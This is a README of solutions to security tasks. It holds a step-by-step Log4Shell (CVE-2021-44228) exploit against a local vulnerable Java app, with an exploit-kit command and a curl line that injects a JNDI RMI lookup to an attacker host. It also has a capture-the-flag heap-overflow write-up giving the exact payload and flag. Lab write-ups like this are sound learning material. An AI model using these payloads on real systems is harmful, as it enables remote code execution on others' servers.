# Tasks

Solutions and instructions to reproduce of provided tasks.

# Task 1 (RCE using log4j vulnerability)

This guide outlines the steps to exploit a remote code execution vulnerability in a Java web application using the log4shell (CVE-2021-44228) vulnerability.

### Task Overview

The task involves exploiting a vulnerability in the application's log4j library to execute remote code on the target system.

### Environment Setup

- Operating System: Ubuntu 22.04.3 LTS 
- Java Runtime Environment (JRE) version 8
- JNDI Injection Exploit Kit for RCE exploit (https://github.com/welk1n/JNDI-Injection-Exploit) -> mvn to build (optional)
- Target system: Windows 11

### Approach and Solution

The solution exploits the log4shell vulnerability by injecting a malicious payload via the "x-log" header, leading to remote code execution on the target system.

### Exploitation Steps

1. **Start the Vulnerable Application**: Launch the vulnerable web application (`vulnapp.jar`) on the target system.

  ``` java -jar vulnapp.jar```

3. **Prepare the Exploit Kit**: Build and launch the JNDI Injection Exploit Kit on the attacker host with the desired payload (e.g., `calc.exe` for Windows).

 ``` java -jar target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'calc.exe' ```

5. **Craft the Payload**: Construct the payload to be injected through the "x-log" header, leveraging the JNDI Injection Exploit Kit's capabilities.

6. **Trigger the Exploit**: Send the crafted payload to the vulnerable application via curl or similar tools, exploiting the log4shell vulnerability.

 ``` curl http://<IP-ADDRESS>:8888/app/servlet -H 'x-log: ${jndi:rmi://<WSL-IP>:1099/<RMI lookup value as provided by Injection Exploit>}' ```

7. **Verify Remote Code Execution**: Upon successful exploitation, the payload should execute on the target system, demonstrating remote code execution.

### Demonstration of RCE

[![RCE demonstration](https://img.youtube.com/vi/NmcQrE_JIGw/0.jpg)](https://www.youtube.com/watch?v=NmcQrE_JIGw)

## Task 2

The challenge involved a binary with a vulnerability in the way it handled heap-allocated variables. The objective was to manipulate the heap to overwrite a specific variable (`safe_var`) with the string "ACMR". Upon success, the program would display the contents of "flag.txt".

### Environment Setup

Operating system: Ubuntu 22.04.3 LTS

### Approach and Solution

The solution involved a carefully crafted input to a buffer (`input_data`) that when written to, would overflow and overwrite the adjacent `safe_var` on the heap.

### Analyzing the Heap Layout

The heap contained two variables of interest:

- `input_data`: A buffer allocated 5 bytes on the heap.
- `safe_var`: A variable stored directly after `input_data` on the heap, checked by the program to print the flag.

Through analysis, it was clear that writing 32 characters to `input_data` followed by "ACMR" would overflow and fill `safe_var` with the desired string.

### Exploitation Steps

1. **Start the Program**: The binary was executed, and the initial heap state was observed.

2. **Craft the Payload**: A string of 32 "X" characters followed by "ACMR" was prepared as the payload to overflow `input_data` and overwrite `safe_var`.

3. **Execute the Overflow**: The crafted payload was entered into the program via the "Write to buffer" option.

4. **Check Heap State**: After the payload was written to the heap, the new heap state was examined to ensure `safe_var` now contained "ACMR".

5. **Print the Flag**: The option to print the flag was selected, which successfully displayed the contents of the flag due to the correct value in `safe_var`.

### Result

Using the payload `XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXACMR`, the heap overflow was successful, and the flag `acm_ftw` was printed as expected.

### Tools Used

- Decompilation software (e.g., Ghidra, IDA Pro) for analyzing the binary.
- A text editor to craft the payload.
- Terminal to interact with the binary program.

### Lessons Learned

This challenge was an excellent demonstration of a heap overflow vulnerability and underscored the importance of bounds checking in programs. It also showed the power of manual analysis in understanding and manipulating memory in a controlled manner.

![image](https://github.com/theg1239/tasks/assets/52027622/5d86b751-baee-4716-b0d1-3908840c4d9a)










